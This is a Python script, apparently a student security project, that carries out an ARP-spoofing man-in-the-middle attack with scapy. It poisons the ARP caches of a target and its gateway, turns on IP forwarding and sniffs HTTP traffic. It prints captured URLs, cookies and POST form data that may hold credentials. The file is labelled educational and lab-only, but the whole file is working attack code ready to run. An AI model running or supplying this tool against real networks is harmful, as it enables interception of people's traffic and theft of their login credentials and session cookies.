#!/usr/bin/env python3
"""
============================================================
 Rogue Wi-Fi / MITM ARP Spoofing Simulation
 Student: Muhammad Ammar Qaisar (BITF24A052)
 Project: How Attackers Target Smartphones

 ⚠️  EDUCATIONAL USE ONLY
     Run ONLY on an isolated lab network that you own.
     Never use on production or public networks.
============================================================

WHAT THIS SCRIPT DOES:
  1. Performs ARP spoofing between a target and the gateway
     on a local isolated network.
  2. Captures HTTP traffic (port 80) and logs URLs/cookies.
  3. Demonstrates how a Man-in-the-Middle attack works when
     a victim connects to an unsecured/rogue Wi-Fi network.

PREREQUISITES:
  - Linux (Kali Linux recommended)
  - Root / sudo privileges
  - Python 3.8+
  - scapy library:  pip install scapy
  - IP forwarding must be enabled (script does this)

USAGE:
  sudo python3 mitm_simulation.py --target <VICTIM_IP> --gateway <GATEWAY_IP> --iface <INTERFACE>

EXAMPLE (isolated lab):
  sudo python3 mitm_simulation.py --target 192.168.1.50 --gateway 192.168.1.1 --iface eth0
"""

import argparse
import os
import sys
import signal
import time
import threading

try:
    from scapy.all import (
        ARP, Ether, sendp, srp, sniff, IP, TCP, Raw, get_if_hwaddr, conf
    )
except ImportError:
    print("[!] scapy is not installed. Run:  pip install scapy")
    sys.exit(1)


# ── Global state ───────────────────────────────────────────
STOP_EVENT = threading.Event()
ORIGINAL_TARGET_MAC = None
ORIGINAL_GATEWAY_MAC = None


# ── Helper: get MAC address via ARP ────────────────────────
def get_mac(ip, iface):
    """Send ARP request to resolve IP → MAC."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, verbose=False, iface=iface
    )
    if ans:
        return ans[0][1].hwsrc
    return None


# ── ARP Spoofing ───────────────────────────────────────────
def spoof(target_ip, target_mac, spoof_ip, iface):
    """Send a forged ARP reply: tell target_ip that spoof_ip is us."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,                       # ARP reply
        pdst=target_ip,             # victim
        hwdst=target_mac,           # victim MAC
        psrc=spoof_ip               # we claim to be this IP
    )
    sendp(pkt, iface=iface, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac, iface):
    """Restore the original ARP table entry."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    sendp(pkt, count=5, iface=iface, verbose=False)


def arp_spoof_loop(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    """Continuously send spoofed ARP packets in both directions."""
    print("[*] ARP spoofing started  (Ctrl+C to stop)")
    pkt_count = 0
    while not STOP_EVENT.is_set():
        spoof(target_ip, target_mac, gateway_ip, iface)   # tell victim we're gateway
        spoof(gateway_ip, gateway_mac, target_ip, iface)  # tell gateway we're victim
        pkt_count += 2
        sys.stdout.write(f"\r[*] Spoofed packets sent: {pkt_count}")
        sys.stdout.flush()
        time.sleep(1)
    print()


# ── HTTP Sniffer ───────────────────────────────────────────
def packet_callback(pkt):
    """Process sniffed packets and extract HTTP data."""
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors="ignore")

        # Look for HTTP GET / POST requests
        if payload.startswith("GET") or payload.startswith("POST"):
            src = pkt[IP].src
            dst = pkt[IP].dst

            # Extract Host header
            host = ""
            for line in payload.split("\r\n"):
                if line.lower().startswith("host:"):
                    host = line.split(":", 1)[1].strip()
                    break

            # Extract requested path
            first_line = payload.split("\r\n")[0]
            method, path = first_line.split(" ")[0], first_line.split(" ")[1]

            print(f"\n{'='*60}")
            print(f"[HTTP {method}]  {src} → {dst}")
            print(f"   URL : http://{host}{path}")

            # Extract cookies if present
            for line in payload.split("\r\n"):
                if line.lower().startswith("cookie:"):
                    print(f"   Cookie: {line.split(':', 1)[1].strip()[:80]}")

            # For POST – look for form data (potential credentials)
            if method == "POST":
                body_start = payload.find("\r\n\r\n")
                if body_start != -1:
                    body = payload[body_start+4:]
                    if body:
                        print(f"   POST Data: {body[:120]}")

            print(f"{'='*60}")


def sniff_http(iface):
    """Sniff HTTP traffic on the given interface."""
    print(f"[*] Sniffing HTTP traffic on {iface}  (port 80)...")
    sniff(
        iface=iface,
        filter="tcp port 80",
        prn=packet_callback,
        store=False,
        stop_filter=lambda _: STOP_EVENT.is_set()
    )


# ── Signal handler for clean exit ──────────────────────────
def cleanup(sig, frame):
    print("\n\n[!] Interrupt received – restoring ARP tables...")
    STOP_EVENT.set()


# ── Main ───────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Educational MITM / ARP Spoofing Simulation (BITF24A052)"
    )
    parser.add_argument("--target",  required=True, help="Victim IP address")
    parser.add_argument("--gateway", required=True, help="Gateway/router IP address")
    parser.add_argument("--iface",   default="eth0", help="Network interface (default: eth0)")
    args = parser.parse_args()

    # Safety banner
    print("=" * 62)
    print("  ⚠️   EDUCATIONAL MITM SIMULATION – BITF24A052")
    print("  ⚠️   Run ONLY on an isolated lab network you own.")
    print("  ⚠️   Unauthorized use is ILLEGAL and UNETHICAL.")
    print("=" * 62)
    print()

    # Must be root
    if os.geteuid() != 0:
        print("[!] This script must be run as root (sudo).")
        sys.exit(1)

    iface      = args.iface
    target_ip  = args.target
    gateway_ip = args.gateway

    # Resolve MACs
    print(f"[*] Resolving MAC for target  {target_ip} ...")
    global ORIGINAL_TARGET_MAC, ORIGINAL_GATEWAY_MAC
    ORIGINAL_TARGET_MAC = get_mac(target_ip, iface)
    if not ORIGINAL_TARGET_MAC:
        print(f"[!] Could not resolve MAC for {target_ip}. Is it online?")
        sys.exit(1)
    print(f"    → {ORIGINAL_TARGET_MAC}")

    print(f"[*] Resolving MAC for gateway {gateway_ip} ...")
    ORIGINAL_GATEWAY_MAC = get_mac(gateway_ip, iface)
    if not ORIGINAL_GATEWAY_MAC:
        print(f"[!] Could not resolve MAC for {gateway_ip}.")
        sys.exit(1)
    print(f"    → {ORIGINAL_GATEWAY_MAC}")

    # Enable IP forwarding
    print("[*] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # Register cleanup
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    # Start ARP spoofing thread
    spoof_thread = threading.Thread(
        target=arp_spoof_loop,
        args=(target_ip, ORIGINAL_TARGET_MAC,
              gateway_ip, ORIGINAL_GATEWAY_MAC, iface),
        daemon=True
    )
    spoof_thread.start()

    # Start HTTP sniffer (blocks until STOP_EVENT)
    try:
        sniff_http(iface)
    except Exception as e:
        print(f"[!] Sniffer error: {e}")

    # Wait for spoof thread
    spoof_thread.join(timeout=3)

    # Restore ARP tables
    print("[*] Restoring ARP tables...")
    restore(target_ip, ORIGINAL_TARGET_MAC,
            gateway_ip, ORIGINAL_GATEWAY_MAC, iface)
    restore(gateway_ip, ORIGINAL_GATEWAY_MAC,
            target_ip, ORIGINAL_TARGET_MAC, iface)

    # Disable IP forwarding
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[✓] ARP tables restored. IP forwarding disabled. Exiting.")


if __name__ == "__main__":
    main()
